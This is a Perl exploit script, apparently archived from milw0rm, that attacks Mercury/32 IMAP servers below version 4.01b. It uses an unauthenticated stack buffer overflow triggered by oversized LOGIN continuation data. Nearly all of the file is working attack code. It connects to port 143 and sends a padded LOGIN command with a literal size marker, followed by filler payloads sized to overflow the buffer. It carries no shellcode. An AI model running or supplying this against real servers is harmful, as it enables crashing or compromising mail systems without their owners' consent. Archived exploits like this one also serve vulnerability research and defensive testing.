#!/usr/bin/perl
#
# mercurypown-v1.pl
#
# Mercury/32 <v4.01b (win32) remote exploit
# by mu-b - 28 Nov 2006
#
# - Tested on: Mercury/32 v4.01a (win32)
#              Mercury/32 v4.01b (win32)
#
# Stack-based buffer overflow caused by Mercury/32 concatenating
# continuation data into a fixed sized buffer disregarding
# the length of the original command, you do not require authentication.
#
# This is a little harder to exploit than usual since the
# stack frame in question calls end_thread before returning..
# buts it's still possible by at *least* two different ways...
# (i.e. controlling a pointer into sprintf and/or controlling
#  a pointer to be free()).
#
########

use Getopt::Std; getopts('t:n:', \%arg);
use Socket;

&print_header;

my $target;

if (defined($arg{'t'})) { $target = $arg{'t'} }
if (!(defined($target))) { &usage; }

my $imapd_port = 143;
my $send_delay = 1;

my $NOP = 'A';
my $LEN = 9200;#8928;
my $BUFLEN = 8192;

if (connect_host($target, $imapd_port)) {
    print("-> * Connected\n");
    $buf = "1 LOGIN".(" "x($LEN-$BUFLEN))."\{255\}\n";
    send(SOCKET, $buf, 0);
    sleep($send_delay);

    print("-> * Sending payload\n");
    $buf = $NOP x 255;
    send(SOCKET, $buf, 0);
    sleep($send_delay);

    print("-> * Sending payload 2\n");
    $buf = $NOP x $BUFLEN;
    send(SOCKET, $buf, 0);
    sleep($send_delay);

    print("-> * Successfully sent payload!\n");
}

sub print_header {
    print("Mercury/32 <v4.01b (win32) remote exploit\n");
    print("by: <mu-b\@digit-labs.org>\n\n");
}

sub usage {
    print(qq(Usage: $0 -t <hostname>

     -t <hostname>    : hostname to test
));

    exit(1);
}

sub connect_host {
    ($target, $port) = @_;
    $iaddr  = inet_aton($target)                 || die("Error: $!\n");
    $paddr  = sockaddr_in($port, $iaddr)         || die("Error: $!\n");
    $proto  = getprotobyname('tcp')              || die("Error: $!\n");

    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
    connect(SOCKET, $paddr)                      || die("Error: $!\n");
    return(1337);
}

# milw0rm.com [2007-03-06]